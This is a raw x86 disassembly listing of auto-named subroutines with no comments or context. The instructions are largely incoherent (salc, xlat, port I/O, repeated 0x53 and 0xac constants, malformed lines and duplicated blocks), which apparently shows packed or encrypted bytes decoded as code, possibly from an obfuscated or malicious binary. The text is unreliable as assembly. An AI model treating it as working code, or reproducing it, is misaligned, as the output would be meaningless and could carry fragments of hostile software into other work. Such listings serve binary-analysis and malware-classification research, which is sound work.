push ebx
or bl dl
pop ss
ja r-xdata
jno r-xdata
mov edx 0x5353456c
retn
retn
push ebx
retn
sub_47bef3
xor eax 0xbafd16da
and [ ebx + edx * 2 + 0x53 ] 0xc3
pop esp
xlat
inc ecx
push ebx
push ebx
push ebx
mov ebx 0x53530306
salc
xchg ebx eax
pop esp
xlat
push esi
push ebx
push ebx
push ebx
pushad
0x905bda35 0xc3c3
pop esp
xlat
xlat
jne r-xdata
mov edx 0x53537211
retn
push ebx
mov edx 0x5353711c
retn
sub_47bf2f
ficom [ edi ]
ja r-xdata
retn
mov ebx 0x535357b8
shl [ edi ] 0x1
ja r-xdata
cmpsd [ esi ] [ edi ]
cmp [ esi ] esi
or edi [ edx + 0x53534a22 ]
retn
push ebx
or bl dl
pop ss
ja r-xdata
retn
mov edx 0x535357a7
retn
sub_47bfbd
add [ eax ] al
add [ edx + 0x53534924 ] bh
shr [ edi ] 0x1
ja r-xdata
xchg ebp eax
xor eax 0xb8f16da
cmp [ 0xffffffffda35abd8 ] esp
push ebx
pop esp
xlat
test [ eax ] edx
push ebx
push ebx
fcomp st7
ja r-xdata
retn
push ebx
push ebx
push ebx
mov edx 0xacacadd9
retn
sub_47c003
xor eax 0x531528d0
pop esp
xlat
lahf
jle r-xdata
dec edi
push 0x10
dec ebx
pop esp
aad 0x90
jns r-xdata
push ebx
mov edx 0x53537eef
retn
add [ ss : edx + 0x535313e7 ] bh
push ebx
shl [ edi ] 0x1
ja r-xdata
retn
push ebx
push ebx
push ebx
mov ebx 0x53535548
push ebx
ficom [ edi ]
ja r-xdata
cmp esp [ eax - 0x45ffc9d9 ]
out 0x13 eax
push ebx
push ebx
push ebp
push ebx
push ebx
mov edx 0x5353516d
cmp [ ebx ] edx
jmp r-xdata
retn
sub_47c04e
fsubr [ ebp - 0x4cd125cb ]
mov edx 0x53537628
ficom [ edi ]
ja r-xdata
cmp ebx [ esi + 0x43342e9 ]
ficom [ edi ]
ja r-xdata
xchg [ ebx + 0x53 ] edx
push 0x10
dec ebx
pop esp
aad 0x90
jns r-xdata
retn
add [ ss : edx + 0x535313e7 ] bh
push ebx
shl [ edi ] 0x1
ja r-xdata
push ebx
mov ebx 0x53535548
push ebx
push ebx
push ebx
ficom [ edi ]
ja r-xdata
cmp esp [ eax - 0x45ffc9d9 ]
out 0x13 eax
push ebx
push ebx
push ebp
push ebx
push ebx
mov edx 0x5353516d
cmp [ ebx ] edx
jmp r-xdata
retn
sub_47c08a
push ebx
push ebx
push ebx
lodsb [ esi ]
push es
scasd [ edi ]
fcmovbe st5
mov edx [ ebx + 0x53 ]
push ebx
mov ebx 0x53531dbe
fcmovbe st5
fwait
push ebx
push ebx
push ebx
mov ebx 0x53531db1
fsubr [ ebx + 0x42e99e3b ]
xor eax [ edx + ebx * 8 ]
in eax dx
xchg [ ebx + 0x53 ] edx
push ebx
mov ebx 0x53535548
cmp esp [ eax - 0x45ffc9d9 ]
out 0x13 eax
push ebx
push ebx
retn
sub_47c0d0
salc
xchg ebx eax
pop esp
salc
pop esi
push ebx
push ebx
push ebx
mov ebx 0x5353560a
salc
xchg ebx eax
pop esp
xlat
push edi
push ebx
push ebx
push ebx
fisubr [ edi ]
ja r-xdata
cmp edx [ ebx - 0x2d ]
push ebx
push ebx
mov edx 0x53537464
mov ebx 0x535356c6
cmp ebp [ edi ]
add dh [ ecx + edi ]
add al 0xda
adc eax 0x56d4bb37
push ebx
push ebx
mov edx 0x53531475
retn
mov edx 0x535342c4
retn
sub_47c10b
rcl [ ebx + 0x53 ] cl
push ebx
ficom [ edi ]
ja r-xdata
retn
push 0x54d65c90
push ebx
push ebx
push ebx
add [ ebp + eax * 8 + 0x535353ff ] ch
add al 0x0
lodsb [ esi ]
daa
ja r-xdata
retn
mov ebx 0x53535939
rcl [ edi - 0x2cacc4a1 ] 0x1
push ebx
push ebx
mov edx 0x53537464
mov ebx 0x535356c6
cmp ebp [ edi ]
add dh [ ecx + edi ]
add al 0xda
adc eax 0x56d4bb37
push ebx
push ebx
mov edx 0x53531475
retn
sub_47c197
lodsb [ esi ]
pop ebx
lodsb [ esi ]
add eax 0xd08bd86b
test al 0xac
pop esp
salc
and edx [ ebp + 0x53 ]
push ebx
pushad
xchg ebx eax
mov edx 0xacacaf95
retn
sub_47c1b5
fcomp [ esi ]
pop ebx
js r-xdata
retn
fld [ ebx - 0x54 ]
push ds
pop edi
fild [ edi + 0x52 ]
adc edx eax
pop edi
push ebx
mov edx 0xacacaf85
retn
sub_47c2ab
cmp edx [ ebx - 0x2d ]
push ebx
push ebx
add [ edx + 0x53530366 ] bh
add ebx [ esp + 0x10 ]
aaa
add esi [ 0x357d10d8 ]
push eax
pop ss
ja r-xdata
shr [ edi ] 0x1
ja r-xdata
mov edx 0x535363fd
shr [ ebx - 0x6d39a354 ] 0x1
fsubr [ edx + 0x536a9fba ]
push ebx
retn
push ds
cmpsd [ esi ] [ edi ]
or bh [ ecx ]
sub esi [ 0xffffffffbaa51eda ]
fild [ edi + 0x53 ]
push ebx
retn
push ebx
mov edx 0xacaca9a9
retn
sub_47c3da
rcl [ ebx + 0x53 ] cl
push ebx
fsub [ ebx - 0x28a35a2a ]
out dx al
pop ecx
push ebx
push ebx
fcom [ esi ]
inc ebx
fimul [ ebx - 0x46 ]
pop ss
sbb dl [ ebx + 0x53 ]
retn
sub_47c43b
push 0x2f
ja r-xdata
rcl [ edi - 0x21bcc6a1 ] 0x1
pop ss
ja r-xdata
mov edx 0x5353670e
or al 0xba
pop edx
dec ebx
push ebx
push ebx
xor eax 0x39a716da
or esi [ ss : 0x39a516da ]
and [ ebx ] ecx
mov edx 0xacacad92
mov edx 0xacacacbb
retn
push ebx
fcom [ ebx - 0x28 ]
adc ecx [ ebx - 0x46 ]
pop ecx
js r-xdata
mov edx 0x53536d69
retn
retn
push ebx
retn
sub_47c484
fcom [ eax ]
inc ebx
salc
xchg ebx eax
pop esp
xlat
push edi
push ebx
push ebx
push ebx
add ebp [ ebp + eax + 0x6017395b ]
lodsb [ esi ]
ficom [ edi ]
ja r-xdata
inc ebx
push ebx
push ebx
push ebx
salc
0x5343d65c 0x5353
salc
xchg ebx eax
pop esp
salc
pop ebx
push ebx
push ebx
push ebx
cmp [ ebx - 0x54 ] edx
add al 0x3
mov ebx 0x535355a6
rcl [ edi - 0x21bcc6a1 ] 0x1
pop ss
ja r-xdata
push ebx
fcom [ ebx - 0x28 ]
adc ecx [ ebx - 0x46 ]
pop ecx
js r-xdata
mov edx 0x53536d69
retn
retn
push ebx
retn
sub_47c4d2
call [ ebx + 0x53 ]
push ebx
cmp edx [ ebx - 0x2d ]
push ebx
push ebx
cmp [ ebx - 0x54 ] edx
daa
ja r-xdata
scasd [ edi ]
ficom [ esi ]
mov bh 0xd8
push ss
stosd [ edi ]
ficom [ esi ]
mov ebx 0x5355eeba
push ebx
retn
lodsb [ esi ]
add eax 0x7717ac27
inc edi
fcom [ edi ]
ja r-xdata
lodsb [ esi ]
pop esp
mov edx 0x53535655
retn
sub_47c50a
add ch dl
arpl [ ebx + 0x53 ] dx
push ebx
aaa
fcom [ edx - 0x28 ]
adc ebx [ edi - 0x28 ]
adc ebx [ edi - 0x28 ]
push ebx
fcom [ ebx - 0x28 ]
adc ecx [ ebx - 0x46 ]
pop ecx
js r-xdata
retn
push ebx
retn
sub_47c541
fdivr [ edi + 0x535f2ed0 ]
mov edx 0xacaca6d9
ficomp [ esi ]
cmpsd [ esi ] [ edi ]
fiadd [ esi ]
stosd [ edi ]
fcom [ esi ]
scasd [ edi ]
ficom [ esi ]
mov bh 0xd8
push ss
stosd [ edi ]
ficom [ esi ]
mov ebx 0x5355eeba
push ebx
retn
sub_47c5c7
cmp eax 0xbb1e1e05
insb
push 0xd0c5353
or dh dl
xchg ebx eax
pop esp
xlat
add eax 0xde535318
push ds
xchg esi ebx
push ss
xchg edi eax
mov ebx 0x5353687a
salc
xchg ebx eax
pop esp
xlat
adc [ eax ] bl
push ebx
push ebx
pushad
xchg ebx eax
mov edx 0x53537d9c
retn
sub_47c623
or al 0xba
jo r-xdata
jo r-xdata
push ebx
push ebx
retn
push ebx
xor eax 0xd65c526a
outsb
push ebx
push ebx
push ebx
retn
retn
push ebx
push ebx
fcom [ ebx ]
sub edx eax
scasd [ edi ]
push ebx
push eax
xchg edx eax
fsubr [ ebx ]
dec edi
fmul [ ebx ]
ja r-xdata
push ebx
fcom [ edx ]
outsd
push eax
xchg edx eax
pop esp
xlat
popad
push ebx
push ebx
push ebx
shr [ ebx + 0x3 ] cl
push ss
push ebx
push ebx
pop esp
salc
jne r-xdata
and esi [ ebx - 0x28 ]
adc ecx [ ebx + 0x50 ]
stosb [ edi ]
push eax
mov dl [ eax - 0x5e ]
ficom [ esi ]
stosd [ edi ]
salc
xchg ebx eax
pop esp
salc
imul ebx [ esi ] 0x53
push ebx
pushad
xchg ebx eax
or al 0xd
or [ edx - 0x54e92770 ] bl
push eax
push ds
scasd [ edi ]
mov edx 0x53536fd7
pop esp
fbstp [ eax ]
pushad
push ebx
push ebx
mov edx 0x5353447f
xor eax 0xce72eda
xor eax 0xbae52eda
push eax
popad
push ebx
push ebx
sub_47c66e
pop esp
xlat
stosb [ edi ]
inc ebp
push ebx
push ebx
shr [ esi ] 0x1
scasd [ edi ]
push ebx
pop esp
xlat
mov esp 0xba535345

sub_47c684
mov edx 0x5353750b
add [ ebx ] al
mov ebx 0x53535654
rcl [ edi - 0x545ffa1 ] 0x1
jo r-xdata
push ebx
xor eax 0xd65c526a
outsb
push ebx
push ebx
push ebx
retn
retn
push ebx
push ebx
fcom [ ebx ]
sub edx eax
scasd [ edi ]
push ebx
push eax
xchg edx eax
fsubr [ ebx ]
dec edi
fmul [ ebx ]
ja r-xdata
push ebx
fcom [ edx ]
outsd
push eax
xchg edx eax
pop esp
xlat
popad
push ebx
push ebx
push ebx
shr [ ebx + 0x3 ] cl
push ss
push ebx
push ebx
pop esp
salc
jne r-xdata
and esi [ ebx - 0x28 ]
adc ecx [ ebx + 0x50 ]
stosb [ edi ]
push eax
mov dl [ eax - 0x5e ]
ficom [ esi ]
stosd [ edi ]
salc
xchg ebx eax
pop esp
salc
imul ebx [ esi ] 0x53
push ebx
pushad
xchg ebx eax
or al 0xd
or [ edx - 0x54e92770 ] bl
push eax
push ds
scasd [ edi ]
mov edx 0x53536fd7
pop esp
fbstp [ eax ]
pushad
push ebx
push ebx
mov edx 0x5353447f
xor eax 0xce72eda
xor eax 0xbae52eda
push eax
popad
push ebx
push ebx
sub_47c6e9
or [ ebx + 0x53 ] edx
xor eax 0xd65c526a
outsb
push ebx
push ebx
retn
push ebx
push ebx
fcom [ ebx ]
sub edx eax
scasd [ edi ]
push ebx
push eax
xchg edx eax
fsubr [ ebx ]
dec edi
fmul [ ebx ]
ja r-xdata
push ebx
fcom [ edx ]
outsd
push eax
xchg edx eax
pop esp
xlat
popad
push ebx
push ebx
push ebx
shr [ ebx + 0x3 ] cl
push ss
push ebx
push ebx
pop esp
salc
jne r-xdata
and esi [ ebx - 0x28 ]
adc ecx [ ebx + 0x50 ]
stosb [ edi ]
push eax
mov dl [ eax - 0x5e ]
ficom [ esi ]
stosd [ edi ]
salc
xchg ebx eax
pop esp
salc
imul ebx [ esi ] 0x53
push ebx
pushad
xchg ebx eax
or al 0xd
or [ edx - 0x54e92770 ] bl
push eax
push ds
scasd [ edi ]
mov edx 0x53536fd7
pop esp
fbstp [ eax ]
pushad
push ebx
push ebx
mov edx 0x5353447f
xor eax 0xce72eda
xor eax 0xbae52eda
push eax
popad
push ebx
push ebx
sub_47c7f1
pop esp
salc
sub [ esi + 0x53 ] ebp
push ebx
mov edx 0x53536e3d
mov ebx 0x535369a4
mov edx 0x535348e6
ficom [ esi ]
stosd [ edi ]
fcom [ esi ]
scasd [ edi ]
mov edx 0x53537778
push es
mov edx 0x535318aa
retn
sub_47c85f
xor eax 0x608116da
mov dh bl
push ss
xchg [ 0xffffffffd89d26da ] esi
pop ebx
xor eax 0xd8eb0eda
mov [ ebx ] eax
fcom [ ebp - 0x10f125cb ]
xor eax 0x359306da
fisubr [ esi ]
cdq
mov edx 0x535367a0
mov ebx 0x53534d0a
mov edx 0x5353541c
retn
sub_47c9f7
push 0xd15c5714
dec ebp
jbe r-xdata
dec ecx
je r-xdata
push ebx
pushad
xchg ebx eax
ficom [ edi ]
ja r-xdata
xor eax 0xbaa516da
sbb al 0x55
push ebx
push ebx
retn
push ebx
ficom [ esi ]
lodsb [ esi ]
add edi [ edx + 0x5353673b ]
retn
sbb dl [ ebx + 0x53 ]
retn
mov edx 0x535340dd
retn
sub_47ca19
pop esp
salc
inc edi
push ebx
push ebx
push ebx
ficom [ esi ]
pop [ ebx ]
fcom [ ebp + 0x534feebb ]
push ebx
or dl dh
xchg ebx eax
pop esp
xlat
mov [ eax + 0x53 ] ebp
push ebx
mov edx 0x53535a2a
retn
sub_47ca78
push es
fdivr [ edi + 0x4050002 ]
fsub [ ebx + 0x5ac5339 ]
sub ebx eax
stosd [ edi ]
salc
lodsb [ esi ]
pop esp
xlat
inc esi
push edi
push ebx
push ebx
mov edx 0x5353149c
retn
sub_47cab7
fcom [ esi ]
inc ebx
sbb ebx [ esp - 0x7d ]
fimul [ 0xffffffffacacea57 ]
push ebx
push ebx
fimul [ esi ]
stosd [ edi ]
xchg esp eax
push eax
or ecx [ edx ]
or cl [ edx ]
xor eax 0xd75c8268
dec esp
push ebx
push ebx
mov edx 0x53536883
retn
sub_47cb02
push 0x16
cmpsd [ esi ] [ edi ]
pop esp
rol [ edi - 0x21acacab ] 0x1
push ss
mov bl 0x3
lodsb [ esi ]
and eax 0x5b26ac07
lodsb [ esi ]
scasd [ edi ]
lodsb [ esi ]
mov bh 0xac
add al 0x4f
add [ esi - 0x343b5345 ] ch
push ebx
push ebx
push ebx
push 0xe
pop edi
pop esp
xlat
sub al 0x7a
push ebx
push ebx
lodsb [ esi ]
mov edi 0xaca76cba
lodsb [ esi ]
retn
sub_47cbdd
pop esp
salc
pop eax
inc ebp
push ebx
push ebx
push 0x2e
inc edi
pop esp
salc
insb
jae r-xdata
fcom [ edx - 0x28 ]
adc ebx [ ebx - 0x26 ]
push ss
scasd [ edi ]
mov edx 0xacacb980
retn
push ebx
fcomp st6
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ ebp + eax + 0x519bd037 ]
mov edx 0xacaca1fc
retn
sub_47cc54
push es
fdivr [ edi + 0x572fbfd2 ]
push ebx
push ebx
shl [ esi ] 0x1
mov bh 0x53
add [ 0x5c5352eb ] dh
int1
ficomp [ esi ]
mov bh 0xd8
push ss
mov bh 0x92
stosd [ edi ]
dec esp
sti
push edx
pop esp
xlat
cmpsb [ esi ] [ edi ]
jge r-xdata
mov ebx 0x535363c6
lodsb [ esi ]
daa
ja r-xdata
push ebx
mov edx 0x53536dc2
retn
push ebx
push ebx
retn
fcom [ ebp + 0x53495fbb ]
push ebx
or bl al
sbb al 0x5f
salc
0xa48cd75c 0xacac
mov edx 0xacaca499
retn
sub_47cc9a
pop esp
in al 0x93
add ebx eax
xchg ebp eax
mov ebx 0xacacae80
rcl [ edi + 0x7717da5f ] 0x1
dec ebx
salc
xchg ebx eax
pop esp
xlat
arpl [ ebx + 0x2fd0acac ] bp
ja r-xdata
pushad
sbb edx 0xeebaaf16
dec edi
push ebx
push ebx
retn
push ebx
pop esp
xlat
jbe r-xdata
ficomp [ esi ]
mov bh 0xd8
push ss
mov bh 0x92
stosd [ edi ]
dec esp
sti
push edx
pop esp
xlat
cmpsb [ esi ] [ edi ]
jge r-xdata
lodsb [ esi ]
lodsb [ esi ]
shr [ ebx + ebx * 2 ] 0x1
push ebx
pop esp
xlat
push esp
push ebx
push ebx
push ebx
fcomp [ ebx + 0x5363c6bb ]
push ebx
lodsb [ esi ]
daa
ja r-xdata
mov ebx 0x535363c6
push ebx
mov edx 0x53536dc2
retn
push ebx
push ebx
retn
fcom [ ebp + 0x53495fbb ]
push ebx
or bl al
sbb al 0x5f
salc
0xa48cd75c 0xacac
mov edx 0xacaca499
retn
sub_47cd71
ficom [ edi ]
ja r-xdata
and [ ebx + edx * 2 + 0x53 ] dl
in al dx
sti
xor dl [ ebx + 0x53 ]
xchg esp eax
pop ss
ja r-xdata
salc
xchg ebx eax
pop esp
xlat
int3
dec ebx
mov edx 0x53535377
retn

sub_47ce04
rcl [ ebx + 0x53 ] cl
push ebx
ficom [ edi ]
ja r-xdata
pushad
xchg ebx eax
adc edx [ eax - 0x3c3c3c3d ]
retn
push 0x54d65c90
push ebx
push ebx
push ebx
add [ ebp + eax * 8 + 0x535353ff ] ch
fcomp st4
or cl ch
lodsb [ esi ]
lodsb [ esi ]
0xacea
sub_47ce24
push ebx
push ebx
push ebx
movsb [ edi ] [ esi ]
stosb [ edi ]
add al 0x1
lodsb [ esi ]
daa
ja r-xdata
retn
mov ebx 0xacacae30
rcl [ edi - 0x2cacc4a1 ] 0x1
push ebx
push ebx
add [ edi + 0x77ba4b77 ] ch
push ebx
push ebx
push ebx
retn
sub_47ce88
lodsb [ esi ]
add eax 0xba93d61f
outsd
jpe r-xdata
push ebx
push ebx
fcom [ eax ]
inc edi
cmp [ edi - 0x46 ] edx
mov bl 0x4c
push ebx
push ebx
xor eax 0x99f06da
cmp [ ecx ] esp
xor eax 0xb8316da
xor eax 0x398116da
or esi [ ss : 0x608716da ]
xchg ebx eax
mov edx 0x53534b79
cmp edx [ ebx + 0x53 ]
push ebx
sar [ edx + 0x53536205 ] cl
retn
push ebx
retn
sub_47cee2
call [ ebx + 0x53 ]
push ebx
fcom [ eax ]
inc edi
cmp [ edi - 0x46 ] edx
mov bl 0x4c
push ebx
push ebx
xor eax 0x99f06da
cmp [ ecx ] esp
xor eax 0xb8316da
xor eax 0x398116da
or esi [ ss : 0x608716da ]
xchg ebx eax
mov edx 0x53534b79
cmp edx [ ebx + 0x53 ]
push ebx
sar [ edx + 0x53536205 ] cl
retn
sub_47cf81
add ebx eax
xchg ebp eax
mov ebx 0x53534bdc
or bl dh
pop ss
ja r-xdata
push edi
fstp [ ebx + 0x13 ]
mov edx 0x535311af
retn
add ebx esi
pop ss
ja r-xdata
push ebx
add dl bl
aad 0xbf
push ebx
push ebx
push ebx
mov ebx 0xacaca446
cmp esi [ ebp + 0x30 ]
cmp esp eax
add dl bl
aad 0xbb
push ebx
push ebx
push ebx
mov ebx 0xacaca457
mov edx 0x53535056
retn
mov edx 0x53535457
retn
sub_47d01f
in eax dx
xchg edi eax
push ebx
push ebx
push ebx
fcmove st5
rcl [ ebx + 0x53 ] cl
push ebx
mov ebx 0xacaca5f6
cmp ecx [ ecx ]
mov esp 0xda04be0c
adc eax 0xa5c4bb03
lodsb [ esi ]
lodsb [ esi ]
cmp ebx [ esi ]
inc ecx
dec esp
add [ edx + ebx * 8 ] eax
adc eax 0xa5dabb07
lodsb [ esi ]
lodsb [ esi ]
mov edx 0xacaca6ae
retn
sub_47d07a
ficom [ edi ]
ja r-xdata
cmp [ esi ] esi
xor eax 0xbb116da
cmp [ edx ] ebx
xor eax 0xbb716da
cmp [ edi ] esi
xor eax 0xbb516da
cmp [ esi ] esi
xor eax 0xbbb16da
mov edx 0x53537451
add edi [ ecx ]
push ebp
cmp edi [ ebx - 0x27acacb0 ]
xchg ebp eax
mov ebx 0xacacaab8
fmul [ ebx - 0x29a06830 ]
mov [ edi + edx * 8 + 0x3f ] bl
mov edi 0x1fd8acac
ja r-xdata
retn
push ebx
salc
0xbf33d75c 0xacac
shr [ edx + 0x5f0eba3b ] 0x1
push ebx
push ebx
retn
sub_47d17b
fcom [ esi ]
scasd [ edi ]
fadd [ edi - 0x2b ]
push eax
cmp [ ebx + 0x535360bc ] 0x68
push ss
pop edi
pop esp
xlat
mov [ ebx + 0x16acacac ] edi
scasd [ edi ]
fcom [ esi ]
scasd [ edi ]
push 0x6bbaab16
pop esi
push ebx
push ebx
retn
sub_47d1b1
add ebx eax
xchg ebp eax
mov ebx 0x5353467d
or dl dh
xchg ebx eax
pop esp
salc
and [ esi + 0x53 ] ch
push ebx
ficom [ esi ]
add ebx eax
xchg ebp eax
mov ebx 0x53534649
or dl dh
xchg ebx eax
mov edx 0x535350bb
retn
sub_47d240
pop esp
xlat
mov eax [ 0xffffffffba53535b ]
mov ebx 0xd653537f
xchg ebx eax
pop esp
xlat
push ss
bound edx [ ebx + 0x53 ]
fadd [ edi ]
ja r-xdata
cmpsd [ esi ] [ edi ]
mov edx 0x53534bf3
retn
rcl [ ecx + 0x77d7de57 ] 0x1
retn
sub_47d28b
ficom [ esi ]
scasd [ edi ]
jmp r-xdata
ficom [ esi ]
mov bl 0x3
xchg esp eax
push ss
mov bl 0x32
aaa
and eax 0xb7169432
and edi [ edx ]
pushad
popad
xchg ebp eax
push ss
mov ebx 0x1b05ac53
fmul [ ebx - 0x28a3772a ]
sbb eax 0x3bacacad
xor [ eax + ebx * 2 - 0x6f44ff3e ] dh
mov al [ 0xfffffffff83bacac ]
cmpsb [ esi ] [ edi ]
outsd
add dl bl
aad 0xaf
push ebx
push ebx
push ebx
mov ebx 0xacaca0e1
cmp edi [ esi + 0xbd5561 ]
fcmovbe st5
stosd [ edi ]
push ebx
push ebx
push ebx
mov ebx 0xacaca0f2
mov edx 0xacacad40
retn
sub_47d2da
rcl [ edi - 0x5c2a258d ] 0x1
push ebx
push ebx
push ebx
ficom [ esi ]
mov bl 0x3
xchg esp eax
push ss
mov bl 0x32
aaa
and eax 0xb7169432
and edi [ edx ]
pushad
popad
xchg ebp eax
push ss
mov ebx 0x1b05ac53
fmul [ ebx - 0x28a3772a ]
sbb eax 0x3bacacad
xor [ eax + ebx * 2 - 0x6f44ff3e ] dh
mov al [ 0xfffffffff83bacac ]
cmpsb [ esi ] [ edi ]
outsd
add dl bl
aad 0xaf
push ebx
push ebx
push ebx
mov ebx 0xacaca0e1
cmp edi [ esi + 0xbd5561 ]
fcmovbe st5
stosd [ edi ]
push ebx
push ebx
push ebx
mov ebx 0xacaca0f2
mov edx 0xacacad40
retn
sub_47d39b
rcl [ edi + 0x5c93d647 ] 0x1
xlat
scasd [ edi ]
inc edx
push ebx
push ebx
fcomp [ 0xffffffff8716d87b ]
mov edx 0x53536ecc
pushad
lodsb [ esi ]
add [ edx + edi * 4 ] dl
push ds
popad
push ebx
push ebx
retn
sub_47d3e7
xor eax 0x60a916da
xchg ebx eax
cmp [ ebx ] ebp
xor eax 0xbaaf16da
test eax 0xbbacacb7
mov eax 0xd6acacb8
xchg ebx eax
pop esp
xlat
xchg esp eax
push edx
push ebx
push ebx
mov edx 0x53535f7a
retn
sub_47d4c4
cmp al 0x20
cmp al 0x35
xchg esp eax
push ss
mov bl 0x27
jae r-xdata
aas
jae r-xdata
and eax 0xbeb1694
cmp eax 0xef169405
push ds
push ds
or esi [ esi ]
xchg esp eax
push ss
xchg ebx eax
cmp eax 0x941e1e05
push ss
fwait
and esp [ ecx ]
xor eax 0xd81306da
mov edi [ edx + 0x535354b5 ]
pushad
xchg ebx eax
nop
retn
push ss
lahf
cmp ebp [ edx ]
and esi [ esi ]
xchg esp eax
push ss
and [ ecx ] 0x25
jae r-xdata
push ebx
push ebx
add [ ebp + eax * 8 + 0x535353ff ] ch
cmp ebp [ ebx + edx * 2 - 0x1145acad ]
mov cl 0xac
lodsb [ esi ]
retn
mov edx 0x53536d4e
retn
sub_47d554
adc al 0xac
pop ds
ja r-xdata
retn
pop esp
salc
leave
stosd [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add eax 0xacaeb1bb
lodsb [ esi ]
or dl dh
xchg ebx eax
pop esp
xlat
fwait
jo r-xdata
push 0x53
push ebx
ficom [ esi ]
out dx eax
mov edx 0xacacb57c
retn
push ebx
add [ ebp + eax * 8 + 0x535353ff ] ch
cmp ebp [ ebx + edx * 2 - 0x1145acad ]
mov cl 0xac
lodsb [ esi ]
retn
sub_47d5cc
pushad
xchg ebx eax
or al 0x9a
nop
cmp [ edi + 0x35 ] esp
fiadd [ esi ]
jg r-xdata
retn
fisubr [ esi ]
mov ecx 0x93f390c
xor eax 0xba7d06da
xchg ebp eax
jne r-xdata
push ebx
retn
push ebx
retn
sub_47d5ea
pop esp
in eax dx
imul edx [ eax - 0x64 ] 0x1b11a260
pop esp
salc
scasd [ edi ]
jge r-xdata
push ebx
add ebx eax
xchg ebp eax
mov ebx 0x5353645f
mov edx 0x53535cf2
retn
push ebx
mov edx 0x53536b8b
retn
sub_47d665
ficom [ esi ]
rol [ eax ] cl
mov edx 0x53536269
xor eax 0x39ab16da
and [ ebx ] cl
xor eax 0x60a916da
xchg ebx eax
xor eax 0xbaaf16da
jecxz r-xdata
retn
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d69c
add eax [ esp + eax ]
cmp [ ebx + 0x4 ] esi
add al 0x4
add al 0xde
xlat
ja r-xdata
retn
push ecx
push ebx
push ebx
add ebp [ ebp + eax - 0x548645fd ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47d742
add ebp [ ebp + eax - 0x53542fc9 ]
pop esp
salc
mov edx 0x39535350
push edx
ficom [ edi ]
ja r-xdata
inc edx
mov edx 0x53537a11
retn
add ebx esi
xlat
ja r-xdata
mov edi 0x5103bfd2
push ebx
push ebx
add al 0x39
and [ edx ] cl
cmp [ edx ] esi
fcom [ edx - 0x5348d346 ]
lodsb [ esi ]
retn
push ebx
push ebx
push ebx
add edx [ ebp + 0x63647717 ]
mov ebx 0x535379d9
mov edx 0xacacb57f
retn
sub_47d802
ficom [ esi ]
mov edi 0x16da9360
cmpsd [ esi ] [ edi ]
pushad
lodsb [ esi ]
fsub [ edi ]
out dx al
mov bh 0xba
inc esi
push esi
push ebx
push ebx
retn
sub_47d884
mov ebx 0x53534e35
or cl [ edx ]
or al 0xd6
xchg ebx eax
pop esp
salc
out 0x57 eax
push ebx
push ebx
ficom [ esi ]
mov ebx 0xdede0503
fild [ esi + 0x18bbacac ]
dec esi
push ebx
push ebx
or cl [ edx ]
mov edx 0x53534014
retn
sub_47d9a2
sar [ edi + 0x6004005f ] 0x1
lodsb [ esi ]
add al 0x4
mov edx 0xacacb2d9
pop esp
salc
jne r-xdata
imul esp [ ebp + ebp * 2 - 0x59 ] 0x4
fcmovbe st5
xlat
push ebx
push ebx
push ebx
mov ebx 0xacacbe09
cmp ebx [ esi + 0x495279f ]
fcmovbe st5
fist [ ebx + 0x53 ]
push ebx
mov ebx 0xacacbe1a
cmp ebp [ ebx - 0x52 ]
jns r-xdata
lodsb [ esi ]
lodsb [ esi ]
add dh bl
salc
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebx esi
salc
out 0xab eax
lodsb [ esi ]
lodsb [ esi ]
add ebp [ ebp + eax - 0x64292185 ]
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ ebp + eax - 0x45659fc9 ]
mov [ 0xffffffffc3acacbb ] al
retn
push ds
mov edi 0xacbba7ba
lodsb [ esi ]
retn
mov edx 0xacacbe46
retn
sub_47da05
cmp ebx [ edi - 0x4 ]
nop
loop r-xdata
xchg edx eax
mov edi 0x9e3bacac
inc edx
push ecx
add al 0xda
adc eax 0xbfe0bb73
lodsb [ esi ]
lodsb [ esi ]
cmp eax esp
inc eax
jb r-xdata
ficom [ 0xffffffffbf92bb4f ]
lodsb [ esi ]
lodsb [ esi ]
cmp ebx [ esi + 0x4365142 ]
ficom [ 0xffffffffbfe0bb73 ]
add al 0xda
adc eax 0x7711ba5b
push ebx
push ebx
retn
sub_47da31
push es
fdivr [ edi - 0x45ecc6fe ]
mov dl [ ebx + edx * 2 + 0x53 ]
add dh bl
salc
[ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ esp + eax - 0x3b53fffd ]
call [ ebx + 0x53 ]
push ebx
cmp [ edi ] esi
mov edx 0x5353476d
retn
sub_47da67
cmp [ ebx ] edx
cmp edx [ ebx + 0x63 ]
push ebx
push ebx
lodsb [ esi ]
and eax 0x6725ac03
lodsb [ esi ]
mov bh 0xac
add al 0x73
ficom [ esi ]
scasd [ edi ]
push 0xe
scasd [ edi ]
mov edx 0x535379a9
retn
sub_47dabc
rcl [ ebx + 0x53 ] cl
push ebx
fcmovbe st5
xchg ebx eax
push ebx
push ebx
push ebx
push 0x75d65c90
mov dh 0xac
lodsb [ esi ]
pushad
xchg ebx eax
mov edx 0xacaca9b2
retn
sub_47db0d
xor eax 0x5c536bd0
salc
loop r-xdata
push ebx
retn
push ebx
push ebx
js r-xdata
push ebx
push ebx
mov edx 0xacacb3a3
cmp eax [ ebx + 0x60535252 ]
mov [ eax ] al
lodsb [ esi ]
sub [ ebx - 0x3c3c3c70 ] 0xc3
retn
sub_47db42
dec ecx
push ebx
push ebx
fsubr [ ebx - 0x28a357b0 ]
aad 0x49
push ebx
push ebx
shr [ edi ] 0x1
ja r-xdata
add al 0xba
r-xdata
push edx
pop esp
salc
or eax 0xd053535f
das
ja r-xdata
adc eax 0x6123ba03
push ebx
push ebx
retn
push ebx
retn
jb r-xdata
push edx
mov edx 0x53535a6e
retn
sub_47dbc2
cmp [ ebx + 0x3b ] edx
push ebx
push ebx
push ebx
pop ebx
mov edx 0xacac8c29
pop esp
xlat
and edi [ ebx + 0x16bbacac ]
dec edi
push ebx
push ebx
push 0x30d75c90
mov ebx 0xa560acac
mov edx 0x53535137
retn
sub_47dc5b
cmp esp [ edx - 0x53ecc5b2 ]
in al 0x97
push ebx
push ebx
push ebx
mov ebx 0xacacb5bb
add edi [ edx + 0x5353674f ]
pushad
cmp [ ecx ] 0xeda3524
mov bh 0xba
fcom [ ecx + 0x53 ]
push ebx
retn
sub_47dc98
push es
